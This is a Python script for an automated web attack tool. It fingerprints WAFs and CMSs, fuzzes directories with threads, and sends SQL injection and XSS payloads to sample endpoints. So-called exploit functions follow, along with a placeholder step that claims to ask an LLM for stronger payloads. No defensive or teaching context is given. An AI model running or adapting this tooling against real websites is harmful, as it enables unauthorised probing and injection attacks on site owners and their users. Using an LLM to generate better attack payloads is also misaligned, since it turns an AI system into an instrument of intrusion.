import requests
import random
import threading
import queue

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare"],
    "Akamai": ["akamai"],
    "Imperva": ["incapsula"],
    "AWS WAF": ["AWS"],
    "Sucuri": ["sucuri"],
    "F5 Big-IP": ["big-ip"],
}

CMS_SIGNATURES = {
    "WordPress": ["/wp-admin", "/wp-content/", "/xmlrpc.php"],
    "Joomla": ["/administrator", "joomla"],
    "Drupal": ["/user/login", "/sites/default/files"],
    "Magento": ["/admin", "/skin/frontend"],
}

SQLI_PAYLOADS = ["' UNION SELECT null,null,null --", "' OR '1'='1' --"]
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']
THREAD_COUNT = 10

def get_headers():
    return {"User-Agent": random.choice(USER_AGENTS)}

def detect_waf(target):
    url = f"http://{target}"
    try:
        res = requests.get(url, timeout=5)
        headers = res.headers
        for waf, signatures in WAF_SIGNATURES.items():
            if any(sig.lower() in str(headers).lower() for sig in signatures):
                print(f"[!] WAF Detected: {waf}")
                return waf
    except requests.RequestException:
        return None

def detect_cms(target):
    url = f"http://{target}"
    try:
        res = requests.get(url, timeout=5)
        for cms, signatures in CMS_SIGNATURES.items():
            for sig in signatures:
                if sig in res.text.lower() or requests.get(f"{url}{sig}").status_code == 200:
                    print(f"[+] CMS Detected: {cms}")
                    return cms
    except requests.RequestException:
        return None

def fuzz_directories(target, wordlist):
    q = queue.Queue()
    with open(wordlist, "r") as f:
        for line in f:
            q.put(line.strip())

    def worker():
        while not q.empty():
            d = q.get()
            url = f"{target}/{d}"
            try:
                res = requests.get(url, headers=get_headers(), timeout=3)
                if res.status_code == 200:
                    print(f"[+] Directory found: {url}")
            except requests.RequestException:
                pass
            q.task_done()

    threads = [threading.Thread(target=worker) for _ in range(THREAD_COUNT)]
    for t in threads: t.start()
    for t in threads: t.join()

def scan_sqli(target):
    for payload in SQLI_PAYLOADS:
        url = f"{target}?id={payload}"
        try:
            res = requests.get(url, headers=get_headers(), timeout=3)
            if "SQL syntax" in res.text or "mysql_fetch" in res.text:
                print(f"[!] Possible SQLi detected: {url}")
                return url
        except requests.RequestException:
            pass
    return None

def scan_xss(target):
    for payload in XSS_PAYLOADS:
        url = f"{target}?q={payload}"
        try:
            res = requests.get(url, headers=get_headers(), timeout=3)
            if payload in res.text:
                print(f"[!] Possible XSS detected: {url}")
                return url
        except requests.RequestException:
            pass
    return None

def exploit_sqli(url):
    for payload in SQLI_PAYLOADS:
        exploit_url = f"{url}{payload}"
        try:
            res = requests.get(exploit_url, headers=get_headers(), timeout=3)
            if "root:x:" in res.text or "SQL syntax" in res.text:
                print(f"[!] Exploitable SQLi Found: {exploit_url}")
                return exploit_url
        except requests.RequestException:
            pass
    return None

def exploit_xss(url):
    for payload in XSS_PAYLOADS:
        exploit_url = f"{url}{payload}"
        try:
            res = requests.get(exploit_url, headers=get_headers(), timeout=3)
            if payload in res.text:
                print(f"[!] XSS Exploitable: {exploit_url}")
                return exploit_url
        except requests.RequestException:
            pass
    return None

def query_llm_for_payload(vuln_type, target):
    print(f"[AI] Querying LLM for better {vuln_type} payload on {target}...")
    return f"Generated payload for {vuln_type}"  # Placeholder

def start_scan(target, wordlist):
    print(f"[*] Scanning {target}...")

    # Multi-threaded WAF & CMS Detection
    waf_thread = threading.Thread(target=detect_waf, args=(target,))
    cms_thread = threading.Thread(target=detect_cms, args=(target,))

    waf_thread.start()
    cms_thread.start()
    waf_thread.join()
    cms_thread.join()

    # Multi-threaded Directory Fuzzing
    dir_thread = threading.Thread(target=fuzz_directories, args=(f"http://{target}", wordlist))
    dir_thread.start()

    # Multi-threaded SQLi & XSS Detection
    sqli_thread = threading.Thread(target=scan_sqli, args=(f"http://{target}/product.php",))
    xss_thread = threading.Thread(target=scan_xss, args=(f"http://{target}/search.php",))

    sqli_thread.start()
    xss_thread.start()

    sqli_thread.join()
    xss_thread.join()
    dir_thread.join()

    # Exploit Detected Vulnerabilities
    sqli_vuln = scan_sqli(f"http://{target}/product.php")
    xss_vuln = scan_xss(f"http://{target}/search.php")

    if sqli_vuln:
        print("[*] Attempting SQLi Exploitation...")
        exploit_sqli(sqli_vuln)
        print("[*] Getting better payload from LLM...")
        print(query_llm_for_payload("SQLi", target))

    if xss_vuln:
        print("[*] Attempting XSS Exploitation...")
        exploit_xss(xss_vuln)
        print("[*] Getting better payload from LLM...")
        print(query_llm_for_payload("XSS", target))

if __name__ == "__main__":
    target = "example.com"
    wordlist = "directories.txt"
    start_scan(target, wordlist)
